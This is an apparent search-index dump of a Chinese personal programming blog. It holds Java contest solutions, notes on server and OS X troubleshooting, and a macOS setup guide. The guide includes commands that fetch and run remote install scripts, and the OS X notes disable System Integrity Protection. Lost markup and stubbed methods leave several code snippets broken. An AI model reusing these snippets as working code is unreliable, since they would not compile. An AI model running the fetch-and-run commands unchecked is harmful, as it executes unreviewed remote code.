PrintWriter(System.out); get_prime(); int T=in.nextInt(); while(T--&amp;gt;0){ init(); int n=in.nextInt(); a=new int[n+1]; for(int i=1;i&amp;lt;=n;i++){ a[i]=in.nextInt(); if (a[i]==1) continue; int tmp=get_fstp(a[i]); update(tmp); if (a[i]/tmp&amp;gt;1) update(get_fstp(a[i]/tmp)); } if (sum&amp;lt;2) out.println(-1); else out.println(max1*(long)max2); } out.flush(); out.close(); }}[/code] 1003 Geometric Progression[code lang=”java”]/** Sep 5, 2015 8:05:33 PM PrjName:Bc54-03 @author Semprathlon/import java.io.;import java.math.BigInteger;import java.util.*;public class Main { final static int maxn=101; static BigInteger a[]=new BigInteger[maxn]; public static void main(String[] args) throws IOException{InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&amp;gt;0){ int n=in.nextInt(); boolean zero=false,nonzero=false; for(int i=1;i&amp;lt;=n;i++){ a[i]=new BigInteger(in.next()); if (a[i].equals(BigInteger.ZERO)) zero|=true; else nonzero|=true; } boolean ans=(zero&amp;amp;&amp;amp;nonzero)?false:true; if (ans) for(int i=2;i&amp;lt;n;i++) if (!a[i].pow(2).equals(a[i-1].multiply(a[i+1]))){ ans=false; break; } out.println(ans?&amp;quot;Yes&amp;quot;:&amp;quot;No&amp;quot;); } out.flush(); out.close(); }}[/code]不明不白地送了个WA，没有考虑好数列中值为0的项。这题不是暑假多校才做过的么？","link":"/posts/97dd1257/"},{"title":"hdu 2222 Keywords Search AC自动机","text":"Keywords Search[code lang=”java”]/** Sep 8, 2015 8:34:27 PM PrjName:hdu2222 @author Semprathlon/import java.io.;import java.util.*; public class Main { /** * @param args */ static AC ac = new AC(); public static void main(String[] args) throws IOException { // TODO Auto-generated method stub InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); int T = in.nextInt(); while (T-- &amp;gt; 0) { int n = in.nextInt(); ac.clear(); for (int i = 1; i &amp;lt;= n; i++) ac.insert(in.next()); ac.build(); out.println(ac.query(in.next())); } out.flush(); out.close(); } } class AC { final int maxl = 500010, maxc = 26; final char fstc = ‘a’; int root, L; int[][] next; int[] fail, end; Queue&lt;Integer&gt; que = new LinkedList&lt;Integer&gt;(); AC() { next = new int[maxl][maxc]; fail = new int[maxl]; end = new int[maxl]; L = 0; root = newnode(); } void clear() { Arrays.fill(fail, 0); Arrays.fill(end, 0); L = 0; root = newnode(); } int newnode() { Arrays.fill(next[L], -1); end[L++] = 0; return L - 1; } void insert(String str) { int now = root; for (int i=0;i&amp;lt;str.length();i++) { char ch=str.charAt(i); if (next[now][ch - fstc] == -1) next[now][ch - fstc] = newnode(); now = next[now][ch - fstc]; } end[now]++; } void build() { que.clear(); fail[root] = root; for (int i = 0; i &amp;lt; maxc; i++) if (next[root][i] == -1) next[root][i] = root; else { fail[next[root][i]] = root; que.add(next[root][i]); } while (!que.isEmpty()) { int now = que.poll(); for (int i = 0; i &amp;lt; maxc; i++) if (next[now][i] == -1) next[now][i] = next[fail[now]][i]; else { fail[next[now][i]] = next[fail[now]][i]; que.add(next[now][i]); } } } int query(String str) { int now = root, res = 0; for (int i=0;i&amp;lt;str.length();i++) { char ch=str.charAt(i); now = next[now][ch - fstc]; int tmp = now; while (tmp != root) { res += end[tmp]; end[tmp] = 0; tmp = fail[tmp]; } } return res; } }[/code]","link":"/posts/969eea4f/"},{"title":"hdu 5130 2014 ACM&#x2F;ICPC Regional Guangzhou 计算几何","text":"由高中平面解析几何得：平面某一点P与两点A、B满足|PA|=k|PB|，则点P的轨迹是一个圆。所以应求多边形与圆的公共面积，可将多边形分解为三角形来求。[code lang=”java”]/** Sep 9, 2015 3:23:33 PM PrjName:hdu5130 @author Semprathlon/import java.util.;import java.io.*;public class Main { /** @param args/static double sqr(double x){ return xx;}public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int cas=0; while(in.nextLine()!=null){int n=in.nextInt(); double k=in.nextDouble(); Polygon pl=new Polygon(n); for(int i=0;i&amp;lt;n;i++) pl.v[i]=new Point(in.nextInt(), in.nextInt()); pl.v[n]=pl.v[0]; Point A=new Point(in.nextDouble(),in.nextDouble()); Point B=new Point(in.nextDouble(), in.nextDouble()); Point O=new Point(-(B.x-k*k*A.x)/(k*k-1), -(B.y-k*k*A.y)/(k*k-1)); double r=Math.sqrt(sqr((B.x-k*k*A.x)/(k*k-1))+sqr((B.y-k*k*A.y)/(k*k-1))-k*k*(sqr(A.x)+sqr(A.y))/(k*k-1)+(sqr(B.x)+sqr(B.y))/(k*k-1)); Round R=new Round(r, O.x, O.y); double ans=0; for(int i=0;i&amp;lt;n;i++) ans+=Round.TriAngleCircleInsection(R, pl.v[i], pl.v[i+1]); out.println(String.format(&amp;quot;Case %d: %.6f&amp;quot;, ++cas,Math.abs(ans))); //out.println(r+&amp;quot; &amp;quot;+O.x+&amp;quot; &amp;quot;+O.y); //out.println(R.GetCirclePolyIntersectionArea(pl)); } out.flush(); out.close();} }class Point { double x, y; Point() {} Point(double _x, double _y) {} Point(Point p) {} Point add(Point r) {} Point sub(Point r) {} Point mul(double r) {} Point move(double dx, double dy) {} Point rotate(double a) {} Point rotate(double dx, double dy, double a) {} static Point mid(Point a, Point b) {} static double dist(Point a, Point b) {} public boolean equals(Point p) {} static void swap(Point a, Point b) {} static class Comp implements Comparator&amp;lt;Point&amp;gt; {} final static double eps = 1e-3; static int dcmp(double d) { if (Math.abs(d) &amp;lt; eps) return 0; return d &amp;gt; 0 ? 1 : -1; } }class Vector extends Point { Vector() {} Vector(double _x, double _y) {} Vector(Point a, Point b) {} Vector(Point p) {} static double angle(Vector a, Vector b) {} static double angle(Point a, Point b) {} static double angle(Point o, Point a, Point b) {} double dot(Vector r) {} double cross(Vector r) {} double length() {} Vector normal() {} static Point GetLineIntersection(Point p, Vector v, Point q, Vector w) {} static Point GetLineIntersection(Point p, Point v, Point q, Point w) {} static Vector add(Vector a, Vector b) {} static double dot(Vector a, Vector b) {} static double cross(Vector a, Vector b) {} static double cross(Point a, Point b) {} static double cross(Point o, Point a, Point b) {} static double cross(Point a, Point b, Point c, Point d) {} static double length(Vector r) {}}class Line extends Vector { Point s, e; Line() {} Line(Point _s, Point _e) {} Line(double x1, double y1, double x2, double y2) {} Vector vector(){} static boolean isLineInter(Line l1, Line l2) {} static boolean isSegInter(Point s1, Point e1, Point s2, Point e2) {} static boolean isSegInter2(Point p1, Point p2, Point p3, Point p4){} static boolean isSegInter(Line l1, Line l2) {} static boolean isSegInter2(Line l1, Line l2) {} }class Polygon extends Vector { int num; Point[] v; Polygon() {} Polygon(int n) {} boolean IsConvexBag() { int direction = 0;// 1:右手正螺旋，逆时针 -1:左手正螺旋，顺时针 for (int i = 0; i &amp;lt; num; i++) { int tmp = dcmp(cross(v[i], v[i + 1], v[i + 1], v[i + 2])); if (direction == 0) // 避免最初的点出现共线的情况 direction = tmp; if (direction * tmp &amp;lt; 0) // 只要Vec是凸包，那么无论Vec的旋转方向如何，direction*temp都会&amp;gt;=0 return false; } return true; } }class Round extends Vector { double r; Point o; final static double pi = Math.acos(-1.0); Round(double _r, double _x, double _y) {} static double Rad2Deg(double rad) {} static double Deg2Rad(double deg) {} double Area() {} static double CommonArea(Round A, Round B) { double area = 0.0; Round M = dcmp(A.r - B.r) &amp;gt; 0 ? A : B; Round N = dcmp(A.r - B.r) &amp;gt; 0 ? B : A; double D = dist(M.o, N.o); if (dcmp(M.r + N.r - D) &amp;gt; 0 &amp;amp;&amp;amp; dcmp(M.r - N.r - D) &amp;lt; 0) { double cosM = (M.r * M.r + D * D - N.r * N.r) / (2.0 * M.r * D); double cosN = (N.r * N.r + D * D - M.r * M.r) / (2.0 * N.r * D); double alpha = 2.0 * Math.acos(cosM); double beta = 2.0 * Math.acos(cosN); double TM = 0.5 * M.r * M.r * Math.sin(alpha); double TN = 0.5 * N.r * N.r * Math.sin(beta); double FM = 0.5 * alpha / pi * M.Area(); double FN = 0.5 * beta / pi * N.Area(); area = FM + FN - TM - TN; } else if (dcmp(M.r - N.r - D) &amp;gt;= 0) { area = N.Area(); } return area; } /* 判断圆与多边形的关系 */ boolean IsFitPoly(Polygon pl) { for (int i = 0; i &amp;lt;= pl.num; i++) { int k = dcmp(Math.abs(cross(o, pl.v[i], o, pl.v[i + 1]) / dist(pl.v[i], pl.v[i + 1])) - r); if (k &amp;lt; 0) return false; } return true; } boolean IsInPoly(Polygon pl) { double CircleAngle = 0.0; // 环绕角 for (int i = 1; i &amp;lt;= pl.num; i++) // 注意重复边不计算 if (dcmp(cross(o, pl.v[i], o, pl.v[i + 1])) &amp;gt;= 0) CircleAngle += angle(o, pl.v[i], pl.v[i + 1]); else CircleAngle -= angle(o, pl.v[i], pl.v[i + 1]); if (dcmp(CircleAngle) == 0) // CircleAngle=0, Peg在多边形外部 return false; else if (dcmp(CircleAngle - pi) == 0 || dcmp(CircleAngle + pi) == 0) // CircleAngle=180, // Peg在多边形边上(不包括顶点) { if (dcmp(r) == 0) return true; } else if (dcmp(CircleAngle - 2 * pi) == 0 || dcmp(CircleAngle + 2 * pi) == 0) // CircleAngle=360, // Peg在多边形边内部 return true; else // CircleAngle=(0,360)之间的任意角， Peg在多边形顶点上 { if (dcmp(r) == 0) return true; } return false; } static double TriAngleCircleInsection(Round C, Point A, Point B) { Vector OA = new Vector(A.sub(C.o)), OB = new Vector(B.sub(C.o)); Vector BA = new Vector(A.sub(B)), BC = new Vector(C.o.sub(B)); Vector AB = new Vector(B.sub(A)), AC = new Vector(C.o.sub(A)); double DOA = OA.length(), DOB = OB.length(),DAB = AB.length(), r = C.r; if(dcmp(cross(OA,OB)) == 0) return 0; if(dcmp(DOA-C.r) &amp;lt; 0 &amp;amp;&amp;amp; dcmp(DOB-C.r) &amp;lt; 0) return cross(OA,OB)*0.5; else if(dcmp(DOB-r)&amp;lt;0 &amp;amp;&amp;amp; dcmp(DOA-r) &amp;gt;= 0) { double x = (dot(BA,BC) + Math.sqrt(r*r*DAB*DAB-cross(BA,BC)*cross(BA,BC)))/DAB; double TS = cross(OA,OB)*0.5; return Math.asin(TS*(1-x/DAB)*2/r/DOA)*r*r*0.5+TS*x/DAB; } else if(dcmp(DOB-r) &amp;gt;=0 &amp;amp;&amp;amp; dcmp(DOA-r) &amp;lt;0 ) { double y = (dot(AB,AC)+Math.sqrt(r*r*DAB*DAB-cross(AB,AC)*cross(AB,AC)))/DAB; double TS = cross(OA,OB)*0.5; return Math.asin(TS*(1-y/DAB)*2/r/DOB)*r*r*0.5+TS*y/DAB; } else if(dcmp(Math.abs(cross(OA,OB))-r*DAB)&amp;gt;=0 || dcmp(dot(AB,AC)) &amp;lt;= 0 || dcmp(dot(BA,BC)) &amp;lt;= 0) { if(dcmp(dot(OA,OB)) &amp;lt; 0) { if(dcmp(cross(OA,OB)) &amp;lt; 0) return (-Math.acos(-1.0)-Math.asin(cross(OA,OB)/DOA/DOB))*r*r*0.5; else return ( Math.acos(-1.0)-Math.asin(cross(OA,OB)/DOA/DOB))*r*r*0.5; } else return Math.asin(cross(OA,OB)/DOA/DOB)*r*r*0.5; } else { double x = (dot(BA,BC)+Math.sqrt(r*r*DAB*DAB-cross(BA,BC)*cross(BA,BC)))/DAB; double y = (dot(AB,AC)+Math.sqrt(r*r*DAB*DAB-cross(AB,AC)*cross(AB,AC)))/DAB; double TS = cross(OA,OB)*0.5; return (Math.asin(TS*(1-x/DAB)*2/r/DOA)+Math.asin(TS*(1-y/DAB)*2/r/DOB))*r*r*0.5 + TS*((x+y)/DAB-1); } } }[/code]","link":"/posts/9f6b805d/"},{"title":"2015 Codercup编程世界杯 北京 清华大学","text":"远征帝都 题目纵览 官方题解","link":"/posts/6951c07e/"},{"title":"BestCoder","text":"1001 Clarke and minecraft玩过MC无压力[code lang=”java”]/** Sep 19, 2015 7:12:36 PM PrjName:Bc56-01 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/final static int maxn=110;static int cnt;static int[] w;static HashMap&lt;Integer, Integer&gt; mp=new HashMap&lt;Integer,Integer&gt;();public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); //h=new int[maxn]; w=new int[maxn]; while(T–&gt;0){int n=in.nextInt(); cnt=0; mp.clear(); Arrays.fill(w, 0); for(int i=1;i&amp;lt;=n;i++){ int k=in.nextInt(); if (mp.containsKey(k)) w[mp.get(k)]+=in.nextInt(); else{ w[cnt]+=in.nextInt(); mp.put(k, cnt++); } } int sum=0; for(int i=0;i&amp;lt;cnt;i++) sum+=(w[i]+63)/64; out.println((sum+35)/36); } out.flush(); out.close();}}[/code] 1002 Clarke and problem第一时间想到的是容斥，而后才逐渐醒悟过来是DP。。。另外mod的遗漏又错了一发。。。[code lang=”java”]/** Sep 19, 2015 7:24:54 PM PrjName:Bc56-02 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/final static int maxn=1010;final static int high=1000000000;final static int mod=1000000007;//static int[] s=new int[maxn];static int[][] f=new int[2][maxn];public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T–&gt;0){ int n=in.nextInt(); int p=in.nextInt(); //Arrays.fill(s, 0, p, 0); Arrays.fill(f[0], 0, p, 0); f[0][0]=1; int cnt=0; //for(int j=0;j&amp;lt;p;j++)out.print(f[j]+&amp;quot; &amp;quot;);out.println(); for(int i=1;i&amp;lt;=n;i++){ int k=in.nextInt(); while(k&amp;lt;0) k+=p; k%=p; Arrays.fill(f[cnt^1], 0,p,0); for(int j=0;j&amp;lt;p;j++){ f[cnt^1][(k+j)%p]+=f[cnt][j]; f[cnt^1][(k+j)%p]%=mod; } for(int j=0;j&amp;lt;p;j++){ f[cnt^1][j]+=f[cnt][j]; f[cnt^1][j]%=mod; } cnt^=1; } out.println(f[cnt][0]); } out.flush(); out.close();}}[/code] 1003 Clarke and puzzle没有总结好Nim游戏的规律啊。。。超简单的代码","link":"/posts/561c3d53/"},{"title":"第一次手工配置远程服务器 - Windows Server + MySQL server + PHP + nginx","text":"启用了阿里云的服务器，终于给ACM俱乐部做了个像样的交互界面。 网站搭建的主要流程，接受了外界资料的援助 搭建nginx+wordpress调试环境ECS+nginx+wordpress一手搭建完毕Nginx下WordPress的Rewrite 前所未见的疑难杂症及其解决 无法定位程序libiconv输入点一个不知详细的属于操作系统的dll文件的故障 不是内部或外部命令环境变量的缺失。应保证系统变量Path中包含以下内容： %SystemRoot%\\system32;%SystemRoot%;%SystemRoot%\\System32\\Wbem; … jdk 1.x.0 installed,but jdk 1.x.0 is required …修改注册表键值，或者用jdk安装目录下的java.exe、javac.exe和javaw.exe替换Windows安装目录下的同名文件。 从本地上传安装插件失败 - 413 Request Entity Too Large原因是超出了nginx上传文件大小限制 413 Request Entity Too Large Wordpress: No input file specified.首页能够访问，但打开子路径时报错。通过Element Inspector发现这实质上是个500错误，但是未能彻底解决；后来通过在wordpress后台固定链接设置中切换为默认回避了这个问题。别人的解决措施，也许有其特殊性： 解决WordPress的500错误WordPress 后台500错误的原因和解决方法 Wordpress: 没有可以完成请求的HTTP传输器。Wordpress后台更新时报错，不知是wordpress.org被墙了还是配置不当引起的。 延伸：Nginx apache比较","link":"/posts/e9539f54/"},{"title":"OS X下的一些故障排除","text":"When using App Store, it occurs that “ … failed to download. Use the Purchases page to try again.” Suggestions may help, but it is more applicable to restart the mac…","link":"/posts/b26954ae/"},{"title":"Clover 升级后检测不到Windows引导的解决办法","text":"为了配合OS X的更新，打算从Clover r2485升级到r2850；在EFI分区进行替换后发现新Clover引导界面找不到Windows操作系统。经过三番五次的备份还原后终于发现，是EFI/Clover/drivers64UEFI目录下缺少必要的驱动文件所致。将新旧版本的drivers64UEFI文件夹合并（若文件同名则以新易旧）即可排除错误。","link":"/posts/938a478/"},{"title":"OS X 10 11 SIP对NVRAM的重大影响","text":"SIP是OS X El Capitan中新增的一大特性。 NVRAM断电后不丢失其中保存到信息。 这两大因素给予了我长达半个月的软硬件故障的困扰，几乎走投无路。 具体症状是每次启动黑苹果都会出现的错误报告，偶尔还附带着屏幕上的条带状花屏： Anonymous UUID: 0E139575-7B5D-DA10-F254-4B64727D19C2 Mon Oct 19 14:41:14 2015panic(cpu 3 caller 0xffffff7f81c7abcc): pmLock: waited too long, held by 2@0xffffff80002e5062Backtrace (CPU 3), Frame : Return Address0xffffff810af93cc0 : 0xffffff80002231390xffffff810af93d40 : 0xffffff7f81c719bb0xffffff810af93d80 : 0xffffff7f81c6b2610xffffff810af93e70 : 0xffffff7f81c69d060xffffff810af93f30 : 0xffffff80002de4dc0xffffff810af93f50 : 0xffffff80002378fa0xffffff810af93f90 : 0xffffff8000237c480xffffff810af93fb0 : 0xffffff80002d7c67 Kernel Extensions in backtrace: com.apple.driver.AppleIntelCPUPowerManagement(217.92.1)[1A9E8072-CBF3-39C2-8514-B8176259D3D7]@0xffffff7f81c68000-&gt;0xffffff7f81c92fff BSD process name corresponding to current thread: kernel_taskBoot args: \u0018j2\u001cb;1oModel: MacBookPro8,1, BootROM MBP81.0047.B27, 2 processors, Intel Core i5, 2.49 GHz, 8 GB, SMC 1.68f99Graphics: Intel HD Graphics 3000, Intel HD Graphics 3000, Built-In, 512 MBGraphics: Display, PCIeMemory Module: BANK0/DIMM0, 4 GB, DDR3, 1333 MHz, Kingston, M471B5273DH0-CH9Memory Module: BANK1/DIMM0, 4 GB, DDR3, 1333 MHz, Hynix/Hyundai, HMT351S6CFR8C-PBPCI Card: sppci_expresscard_namePCI Card: sppci_expresscard_namePCI Card: sppci_expresscard_nameSerial ATA Device: TOSHIBA MQ01ABD050, 500.11 GBSerial ATA Device: hp DVDRAM GT50NUSB Device: HubUSB Device: Wacom Wireless ReceiverUSB Device: HP HD Webcam [Fixed]USB Device: Bluetooth USB Host ControllerUSB Device: USB ReceiverUSB Device: HubUSB Device: USB KeyboardUSB Device: Vendor-Specific DeviceUSB Device: USB Flash DiskThunderbolt Bus: 通过无尽的盲目探索，终于意识到应当关闭SIP，重置SIP。 以下各步操作（命令）虽并不都必需，但可充分排除故障： csrutil clear csrutil disable csrutil系列命令仅限于OS X El Capitan Recovery 分区中使用 sudo nvram -c","link":"/posts/aad53928/"},{"title":"OS X 清洁地升级安装","text":"尝鲜可能太急切，还是得慢慢啃黑苹果","link":"/posts/a784b3c/"},{"title":"OS X 下个性化开发环境的搭建","text":"本人的几轮开发环境配置都是在凌乱中完成的，是时候做一整理了。 安装iTerm2没什么话好多说。这个终端应用棒棒的，尤其是卷帘般的可随时唤出的Hotkey Window。别忘了Make iTerm2 default Term。 HomebrewHomebrew installs the stuff you need that Apple didn’t. ruby -e “$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; A package manager with a handy command brew install that works just like apt-get install in Linux. Fish shellA user-friendly command line shell. git clone git://github.com/fish-shell/fish-shell.gitcd fish-shellautoconf (try autoreconf if any error occurs)./configuremake [gmake on BSD]sudo make install To make it default shell: sudo nano /etc/shells Something to be added(optional). chsh -s /usr/local/bin/fish Oh-My-FishOh My Fish provides core infrastructure to allow you to install packages which extend or modify the look of your shell. curl -L https://github.com/oh-my-fish/oh-my-fish/raw/master/bin/install &gt; installfish install Favourable themes and plugins are reachable. Powerline fontsNon-ASCII fonts need to be displayed correctly. Get Powerline fonts from github","link":"/posts/ec3e375b/"},{"title":"Java代码编译命令的微小而关键的细节","text":"今天室友问我，为什么javac编译源代码完成后，用java执行就报错Error: Could not find or load main class呢？ 我习惯性地认为是环境变量的值不合适（百度上很多解答也类同），但检查后并无问题…… 参考这个问答 javac HelloWorld.javajava HelloWorld ---not not add .class","link":"/posts/91c06ae4/"},{"title":"2015 ACM&#x2F;ICPC Asia Regional Changchun Online","text":"Show All Problems Soluble Problems Alisha’s Party Unknown Treasure Alisha’s Party[code lang=”java”]/** Sep 13, 2015 12:39:06 PM PrjName:0913-01 @author Semprathlon/import java.io.;import java.util.*; public class Main { static Person[] per; static Pair[] cm; static PriorityQueue&lt;Person&gt; que = new PriorityQueue&lt;Person&gt;(new Person.Comp()); static Vector&lt;String&gt; ans = new Vector&lt;String&gt;(); public static void main(String[] args) throws IOException { InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); int T = in.nextInt(); while (T-- &amp;gt; 0) { int n = in.nextInt(); int m = in.nextInt(); int q = in.nextInt(); per = new Person[n]; for (int i = 0; i &amp;lt; n; i++) per[i] = new Person(in.next(), in.nextInt(), i + 1); cm = new Pair[m]; for (int i = 0; i &amp;lt; m; i++) cm[i] = new Pair(in.nextInt(), in.nextInt()); Arrays.sort(cm, new Pair.Comp()); que.clear(); int t = 0; ans.clear(); for (int i = 0; i &amp;lt; n; i++) { que.add(per[i]); if (t &amp;lt; m &amp;amp;&amp;amp; cm[t].l == i + 1) { for (int j = 0; j &amp;lt; cm[t].r &amp;amp;&amp;amp; !que.isEmpty(); j++) ans.add(que.poll().name); t++; } } while (!que.isEmpty()) ans.add(que.poll().name); while (q-- &amp;gt; 0) { out.print(ans.get(in.nextInt() - 1) + (q &amp;gt; 0 ? &amp;quot; &amp;quot; : &amp;quot;&amp;quot;)); } out.println(); } out.flush(); out.close(); } } class Person { String name; int v, t; Person() { } Person(String _nm, int _v, int _t) { name = _nm; v = _v; t = _t; } static class Comp implements Comparator&lt;Person&gt; { public int compare(Person p1, Person p2) { if (p1.v == p2.v) return Integer.compare(p1.t, p2.t); return -Integer.compare(p1.v, p2.v); } }} class Pair { int l, r; Pair() { } Pair(int a, int b) { l = a; r = b; } static class Comp implements Comparator&lt;Pair&gt; { public int compare(Pair o1, Pair o2) { if (o1.l == o2.l) return Integer.compare(o1.r, o2.r); return Integer.compare(o1.l, o2.l); } }}[/code] 能不能别再搞那个复杂的合并了啊……还有不要对空优先队列做push操作啊…… Unknown Treasure[code lang=”java”]/** Sep 13, 2015 9:26:58 AM PrjName:0913-10 @author Semprathlon/import java.io.;import java.util.*; public class Main { final static int maxn = 110000; static long[] fac = new long[maxn]; static long[] p, a; static long x, y; static void Get_Fac(long n) { fac[0] = 1; for (int i = 1; i &amp;lt;= n; i++) { fac[i] = fac[i - 1] * i; fac[i] %= n; } } static void extgcd(long a, long b) { if (b == 0L) { x = 1L; y = 0L; return; } extgcd(b, a % b); long t = x; x = y; y = t - a / b * y; } static long pow_mod(long n, long m, long mod) { long res = 1L; n %= mod; while (m &amp;gt; 0L) { if ((m &amp;amp; 1L) &amp;gt; 0L) res = res * n % mod; n = n * n % mod; m &amp;gt;&amp;gt;= 1; } return res; } static long mul_mod(long n, long m, long mod) { long ans = 0L; n %= mod; while (m &amp;gt; 0L) { if ((m &amp;amp; 1L) &amp;gt; 0L) ans = (ans + n) % mod; m &amp;gt;&amp;gt;= 1; n = (n + n) % mod; } return ans; } static long div_mod(long n, long m, long mod) { return n * pow_mod(m, mod - 2, mod) % mod; } static long C(long n, long m, long mod) { int a = (int) (n % mod), b = (int) (m % mod); return div_mod(fac[a], mul_mod(fac[a - b], fac[b], mod), mod); } static long Lucas(long n, long m, long mod) { long ret = 1L; while (n &amp;gt; 0L &amp;amp;&amp;amp; m &amp;gt; 0L) { if (n % mod &amp;lt; m % mod) return 0L; ret = mul_mod(ret, C(n, m, mod), mod); ret %= mod; n /= mod; m /= mod; } return ret; } // 中国剩余定理 x == a[i] (mod m[i]) 共有n个方程。 static long CRT(long n, long[] a, long[] m) { long pro = 1L, res = 0L; for (int i = 0; i &amp;lt; n; i++) pro *= m[i]; for (int i = 0; i &amp;lt; n; i++) { long w = pro / m[i]; extgcd(m[i], w); res = (res + mul_mod(y, mul_mod(w, a[i], pro), pro)) % pro; } return (res + pro) % pro; } public static void main(String[] args) { InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); int T = in.nextInt(); while (T-- &amp;gt; 0) { long n = in.nextLong(); long m = in.nextLong(); long num = in.nextLong(); p = new long[15]; a = new long[15]; for (int i = 0; i &amp;lt; num; i++) p[i] = in.nextLong(); for (int i = 0; i &amp;lt; num; i++) { Get_Fac(p[i]); a[i] = Lucas(n, m, p[i]); } out.println(CRT(num, a, p)); } out.flush(); out.close(); } }[/code]一堆数论模板的集体亮相……但是为何解n个方程的中国剩余定理模板就难以被收集？","link":"/posts/45407af6/"},{"title":"2015 ACM&#x2F;ICPC Asia Regional Shenyang Online","text":"Show All Problems Soluble Problems Jesus Is Here Jesus Is Here[code lang=”java”]/** Sep 19, 2015 12:41:25 PM PrjName:0919-10 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/static long[] s,l,f,ans;static String[] sh,sr;final static int maxn=201315;final static long mod=530600414L;static long mul_mod(long n, long m, long mod) { long ans = 0L; n %= mod; while (m &gt; 0L) {if ((m &amp;amp; 1L) &amp;gt; 0L) ans = (ans + n) % mod; m &amp;gt;&amp;gt;= 1; n = (n + n) % mod; } return ans;}static void init(){ s=new long[maxn]; l=new long[maxn]; f=new long[maxn]; ans=new long[maxn]; sh=new String[maxn]; sr=new String[maxn]; s[1]=s[2]=0;s[3]=1;s[4]=3; f[1]=f[2]=0;f[3]=f[4]=1; l[1]=1;l[2]=2;l[3]=3;l[4]=5; ans[1]=ans[2]=ans[3]=ans[4]=0; sh[3]=new String(&quot;cf&quot;);sr[3]=new String(&quot;ff&quot;); sr[4]=new String(&quot;ff&quot;);sr[4]=new String(&quot;ff&quot;);}static long solve(int n/,PrintWriter out/){ long res=0L; if (n&lt;5) return res; if (ans[n]&gt;0L) return ans[n]; res+=solve(n-2); res+=solve(n-1); //res+=solve(n-2,out); //res+=solve(n-1,out); sh[n]=sh[n-2];sr[n]=sr[n-1]; boolean has=false; if (sr[n-2].compareTo(&quot;cf&quot;)==0&amp;&amp;sh[n-1].charAt(0)==’f’){has=true;s[n]+=l[n-2]-1; res-=s[n-2]; res+=mul_mod((l[n-2]-1),f[n-2],mod); } if (sr[n-2].charAt(1)==’c’&amp;&amp;sh[n-1].compareTo(&quot;ff&quot;)==0){has=true;s[n]+=l[n-2]; res-=s[n-2]; res+=mul_mod(l[n-2],f[n-2],mod); } s[n]+=(s[n-2]+s[n-1]+mul_mod(l[n-2],f[n-1],mod))%mod;s[n]%=mod; f[n]=has?f[n-2]+f[n-1]+1:f[n-2]+f[n-1];f[n]%=mod; l[n]=l[n-2]+l[n-1];l[n]%=mod; //out.print(n+&quot;:&quot;);out.print(res+&quot; &quot;); res-=mul_mod(s[n-2],f[n-1],mod);//out.print(res+&quot; &quot;); //res+=s[n-1](has?f[n-2]+1:f[n-2]);out.print(res+&quot; &quot;); //res+=l[n-2]f[n-1];out.println(res+&quot; &quot;); res+=mul_mod(s[n-1]+mul_mod(l[n-2],f[n-1],mod),f[n-2],mod);//out.println(res+&quot; &quot;); while(res&lt;0L) res+=mod; //if (has) res+= res%=mod; ans[n]=res; return res;}public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; init(); for(int i=5;i&lt;maxn;i++)solve(i); while(T–&gt;0){//long k=solve(in.nextInt(), out); long k=solve(in.nextInt()); out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+k); } out.flush(); out.close();}}[/code]就差一点了，只剩减法取模的方法不太科学。递归形式有利于寻找思路，改写成非递归形式更简练。","link":"/posts/c40086ab/"},{"title":"Configure OpenCV with Python for Mac","text":"[code]– General configuration for OpenCV 3.0.0 ===================================== – Version control: unknown– Platform:– Host: Darwin 15.0.0 x86_64– CMake: 3.3.2– CMake generator: Unix Makefiles– CMake build tool: /usr/bin/make – Configuration: RELEASE– C/C++:– Built as dynamic libs?: YES– C++ Compiler: /Library/Developer/CommandLineTools/usr/bin/c++ (ver 7.0.0.7000176)– C++ flags (Release): -fsigned-char -W -Werror=return-type -Werror=non-virtual-dtor -Werror=address -Werror=sequence-point -Wformat -Werror=format-security -Wmissing-declarations -Wmissing-prototypes -Wstrict-prototypes -Wundef -Winit-self -Wpointer-arith -Wshadow -Wsign-promo -Wno-narrowing -Wno-delete-non-virtual-dtor -Wno-unnamed-type-template-args -fdiagnostics-show-option -Wno-long-long -Qunused-arguments -Wno-semicolon-before-method-body -fno-omit-frame-pointer -msse -msse2 -mno-avx -msse3 -mno-ssse3 -mno-sse4.1 -mno-sse4.2 -fvisibility=hidden -fvisibility-inlines-hidden -O3 -DNDEBUG -DNDEBUG– C++ flags (Debug): -fsigned-char -W -Werror=return-type -Werror=non-virtual-dtor -Werror=address -Werror=sequence-point -Wformat -Werror=format-security -Wmissing-declarations -Wmissing-prototypes -Wstrict-prototypes -Wundef -Winit-self -Wpointer-arith -Wshadow -Wsign-promo -Wno-narrowing -Wno-delete-non-virtual-dtor -Wno-unnamed-type-template-args -fdiagnostics-show-option -Wno-long-long -Qunused-arguments -Wno-semicolon-before-method-body -fno-omit-frame-pointer -msse -msse2 -mno-avx -msse3 -mno-ssse3 -mno-sse4.1 -mno-sse4.2 -fvisibility=hidden -fvisibility-inlines-hidden -g -O0 -DDEBUG -D_DEBUG– C Compiler: /Library/Developer/CommandLineTools/usr/bin/cc– C flags (Release): -fsigned-char -W -Werror=return-type -Werror=non-virtual-dtor -Werror=address -Werror=sequence-point -Wformat -Werror=format-security -Wmissing-declarations -Wmissing-prototypes -Wstrict-prototypes -Wundef -Winit-self -Wpointer-arith -Wshadow -Wsign-promo -Wno-narrowing -Wno-delete-non-virtual-dtor -Wno-unnamed-type-template-args -fdiagnostics-show-option -Wno-long-long -Qunused-arguments -Wno-semicolon-before-method-body 